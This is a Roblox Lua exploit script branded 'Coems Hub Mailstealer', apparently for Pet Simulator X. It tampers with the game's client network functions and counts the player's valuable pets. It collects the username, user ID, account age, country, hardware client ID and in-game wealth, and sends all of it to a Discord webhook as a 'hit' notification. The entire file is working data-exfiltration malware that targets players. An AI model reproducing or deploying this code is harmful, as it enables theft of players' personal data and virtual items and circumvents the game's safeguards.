local Client = require(game.ReplicatedStorage.Library.Client)
    local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network)
    local Invoke = Network.Invoke
    local Fire = Network.Fire
    debug.setupvalue(Client.Network.Invoke, 1, function() return true end)
    debug.setupvalue(Client.Network.Fire, 1, function() return true end)
    local Library = require(game.ReplicatedStorage.Framework.Library);

local savedPets = Library.Save.Get().Pets
hugeamount = 0
for i,v in pairs(savedPets) do
	local v2 = Library.Directory.Pets[v.id]
	    if v2.huge == true then
		hugeamount = hugeamount + 1
	end
end

exclusiveamount = 0
for i,v in pairs(savedPets) do
	local v2 = Library.Directory.Pets[v.id]
	    if v2.rarity == "Exclusive" then
		exclusiveamount = exclusiveamount + 1
	end
end
exclusiveamount = exclusiveamount - hugeamount

eventamount = 0
for i,v in pairs(savedPets) do
	local v2 = Library.Directory.Pets[v.id]
	    if v2.rarity == "Event" then
		eventamount = eventamount + 1
	end
end

secretamount = 0
for i,v in pairs(savedPets) do
	local v2 = Library.Directory.Pets[v.id]
	    if v2.rarity == "Secret" then
		secretamount = secretamount + 1
	end
end
    

local url = _G.Webhook
local username = game:GetService("Players").LocalPlayer.Name
local fardplayer = game.Players.LocalPlayer
local RAP = game.Players.LocalPlayer.leaderstats.RAP.Value
local display = game.Players.LocalPlayer.DisplayName
local country = game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(game.Players.LocalPlayer)
local imgs = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. fardplayer.userId .. "&width=420&height=420&format=png"
local rank = game.Players.LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
local executor = identifyexecutor()
local diamond = game.Players.LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text
local Loading = game.Players.LocalPlayer.PlayerGui.Loading.Frame.Info.Location.Text
local Game = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
local Pets = game.Players.LocalPlayer.PlayerGui.Inventory.Frame.PetAmount.Text
local HardWareId = game:GetService("RbxAnalyticsService"):GetClientId()
request = http_request or request or HttpPost or syn.request

local data1 = {
    ["content"] = "||@everyone||\n**:comet:Coems Hub Mailstealer Detected A Hit:comet:**", -- Free Webhook logging
    ["embeds"] = {
        {
            ["title"] = "```Coems Hub Mailstealer Results```",
            ["url"] = "https://discord.gg/scripter",
            ["description"] = "```This data was generated using Coems Hub Mailstealer```",
            ["type"] = "rich",
            ["color"] = tonumber(0x00bfff),
            ["thumbnail"] = {
                ["url"] = imgs,
                ["height"] = 420,
                ["width"] = 420
            },
            ["fields"] = {
                {
                    ["name"] = "Data Generated:",
                    ["value"] = "**:detective:Username : " ..username .. "\n:detective:User ID : " ..fardplayer.userId .. "\n:underage:Account Age : " ..fardplayer.AccountAge .. "\n:crown:Rank:" ..rank.. "\n:computer: Exploit : " ..executor.. "\n:mag:Place :" ..Game.. "\n:mag:Country : " ..country.. "**", -- AAstraxXTopG
                    ["inline"] = false
                },
                {
                    ["name"] = "<:diamond_psx:1118474311615918080>Diamonds<:diamond_psx:1118474311615918080>",
                    ["value"] = "```>>> "..game.Players.LocalPlayer.leaderstats.Diamonds.Value.."```",
                    ["inline"] = false

                },
                {          
                    ["name"] = ":bar_chart:RAP:bar_chart:",
                    ["value"] = "```>>> "..RAP.."```",
                    ["inline"] = false
                },
                {
                    ["name"] = "<:huge_cat:1118474511763906660>Huge Pets<:huge_cat:1118474511763906660>",
                    ["value"] = "```>>> "..hugeamount.."```",
                    ["inline"] = true
                },
                {
                    ["name"] = " <:capybara:1118564875078209668>Exclusive Pets<:capybara:1118564875078209668>",
                    ["value"] = "```>>> "..exclusiveamount.."```",
                    ["inline"] = true
                },
                {
                    ["name"] = "<:event:1112767158049591307>Event Pets<:event:1112767158049591307>",
                    ["value"] = "```>>> "..eventamount.."```",
                    ["inline"] = true
                },
            }
        }
    }
}
local newdata1 = game:GetService("HttpService"):JSONEncode(data1)

local headers = {
    ["content-type"] = "application/json"
}
local abcdef1 = {Url = url, Body = newdata1, Method = "POST", Headers = headers}
request(abcdef1)
